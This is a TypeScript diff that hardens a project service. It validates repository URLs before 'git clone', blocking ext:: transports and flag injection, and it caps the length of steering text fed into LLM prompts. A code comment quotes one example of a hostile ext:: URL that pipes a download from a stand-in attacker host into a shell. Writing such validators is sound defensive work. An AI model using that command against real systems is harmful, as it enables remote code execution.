@@ -530,7 +530,11 @@ export class ProjectApprovalError extends Error {
 
 export class ProjectRegistrationError extends Error {
   constructor(
-    public readonly code: "clone_target_conflict" | "git_clone_failed" | "missing_repository_source",
+    public readonly code:
+      | "clone_target_conflict"
+      | "git_clone_failed"
+      | "missing_repository_source"
+      | "invalid_repository_url",
     message: string,
     public readonly statusCode: number
   ) {
@@ -1106,7 +1110,68 @@ function gitFailureMessage(error: unknown): string {
   return details ?? "Git command failed";
 }
 
+/**
+ * Allowed schemes for `git clone`. Critically, this list excludes `ext::` and
+ * any other transport that lets git execute arbitrary local commands. The
+ * `--` separator below also blocks any flag injection through the URL.
+ */
+const ALLOWED_GIT_URL_SCHEMES = new Set(["https:", "http:", "git:", "ssh:"]);
+
+/** Validate a repo URL is safe to pass to `git clone`. Throws on rejection. */
+export function assertSafeGitRepoUrl(repoUrl: string): void {
+  const trimmed = repoUrl.trim();
+  if (!trimmed) {
+    throw new ProjectRegistrationError("invalid_repository_url", "Repository URL is empty", 400);
+  }
+  // Reject anything that starts with `-` or contains `::` (the `ext::` family
+  // of git transports executes arbitrary commands, e.g.
+  // `ext::sh -c 'curl evil.com|sh' %S`).
+  if (trimmed.startsWith("-")) {
+    throw new ProjectRegistrationError("invalid_repository_url", "Repository URL must not start with '-'", 400);
+  }
+  if (trimmed.includes("::")) {
+    throw new ProjectRegistrationError(
+      "invalid_repository_url",
+      "Repository URLs using the git ext:: transport are not allowed",
+      400
+    );
+  }
+  // SSH form: git@host:owner/repo
+  if (trimmed.startsWith("git@")) {
+    if (!/^git@[A-Za-z0-9.\-]+:[A-Za-z0-9._\-/]+$/.test(trimmed)) {
+      throw new ProjectRegistrationError(
+        "invalid_repository_url",
+        "Repository URL is not a valid SSH form",
+        400
+      );
+    }
+    return;
+  }
+  // URL form: must parse and use an allowed scheme
+  let parsed: URL;
+  try {
+    parsed = new URL(trimmed);
+  } catch {
+    throw new ProjectRegistrationError("invalid_repository_url", "Repository URL is not a valid URL", 400);
+  }
+  if (!ALLOWED_GIT_URL_SCHEMES.has(parsed.protocol)) {
+    throw new ProjectRegistrationError(
+      "invalid_repository_url",
+      `Repository URL scheme '${parsed.protocol}' is not allowed (use https, http, git, ssh, or git@)`,
+      400
+    );
+  }
+  if (!parsed.hostname) {
+    throw new ProjectRegistrationError(
+      "invalid_repository_url",
+      "Repository URL must include a hostname",
+      400
+    );
+  }
+}
+
 async function cloneRepository(repoUrl: string, targetPath: string): Promise<void> {
+  assertSafeGitRepoUrl(repoUrl);
   try {
     await execFileAsync("git", ["clone", "--origin", "origin", "--", repoUrl, targetPath]);
   } catch (error) {
@@ -4732,6 +4797,10 @@ export async function createProjectMessage(projectId: string, input: ProjectMess
   });
 }
 
+/** Maximum length of operator steering content. Caps the size of guidance
+ * that gets stored in the decision log and later fed into LLM prompts. */
+const MAX_STEER_CONTENT_CHARS = 8 * 1024;
+
 export async function steerProjectJob(projectId: string, jobId: string, content: string): Promise<ProjectDecisionLogSummary> {
   const job = await prisma.job.findFirst({
     where: {
@@ -4761,6 +4830,13 @@ export async function steerProjectJob(projectId: string, jobId: string, content:
   const steerContent = content.trim();
   if (!steerContent) {
     throw new ProjectRoleDefinitionError("invalid_role_definition", "Steering content is required", 400);
+  }
+  if (steerContent.length > MAX_STEER_CONTENT_CHARS) {
+    throw new ProjectRoleDefinitionError(
+      "invalid_role_definition",
+      `Steering content must be at most ${MAX_STEER_CONTENT_CHARS} characters`,
+      400
+    );
   }
 
   // Prepend @mention so guidance is routed to the running agent role
